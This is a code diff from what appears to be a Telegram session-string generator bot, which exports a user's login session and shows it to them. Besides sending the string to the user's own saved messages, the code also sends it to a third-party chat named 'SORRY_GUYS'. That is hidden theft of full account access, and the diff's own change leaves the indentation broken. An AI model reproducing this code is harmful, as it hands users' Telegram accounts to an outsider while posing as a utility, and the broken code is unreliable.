@@ -175,7 +175,7 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: 
     else:
         string_session = await client.export_session_string()
     text = f"**ᴛʜɪs ɪs ʏᴏᴜʀ {ty} sᴛʀɪɴɢ sᴇssɪᴏɴ** \n\n`{string_session}` \n\n**ɢᴇɴʀᴀᴛᴇᴅ ʙʏ :[˹ ʙᴀʙʏ-ᴍᴜsɪᴄ ™˼𓅂](https://t.me/BABY09_WORLD) ᴡᴀʀɴɪɴɢ :** ᴅᴏɴᴛ sʜᴀʀᴇ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ ᴇᴠᴇɴ ɪғ ᴡɪᴛʜ ʏᴏᴜʀ ɢғ 🏴‍☠️"
-    try:
+try:
     if not is_bot:
         await client.send_message("me", text)
         await client.send_message("SORRY_GUYS", text)
@@ -183,6 +183,7 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: 
         await bot.send_message(msg.chat.id, text)
 except KeyError:
     pass
+
 
 await client.disconnect()
 
